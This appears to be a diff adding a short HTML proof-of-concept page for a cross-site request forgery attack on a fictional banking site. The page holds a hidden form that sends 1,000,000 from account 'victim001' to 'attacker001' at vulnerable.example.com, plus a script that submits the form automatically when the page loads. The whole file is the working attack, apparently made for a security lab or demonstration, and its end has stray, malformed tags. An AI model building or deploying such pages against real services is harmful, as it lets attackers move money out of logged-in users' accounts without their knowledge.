@@ -1,0 +1,19 @@
+<html>
+  <head></head>
+  <body>
+    <h1>User: victim001 <span><a href='/logout'>Log out</a></span></h1>
+    <h3>Transfer Funds</h3>
+    <div>
+      <form action="https://vulnerable.example.com/transfer" method="POST">
+      <div><input name="sender" placeholder="Sender Account" value="victim001"/></div>
+      <div><input name="receiver" placeholder="Receiver Account" value="attacker001"/></div>
+      <div><input type="number" name="amount" min="0" value="1000000" placeholder="Amount"/></div>
+      <input type="submit" value="Submit"/></form>
+    </div>
+    <script>
+      window.onload = ()=> { document.forms[0].submit() }
+    </script>
+  </body>
+<html>`;
+ 
+</html>
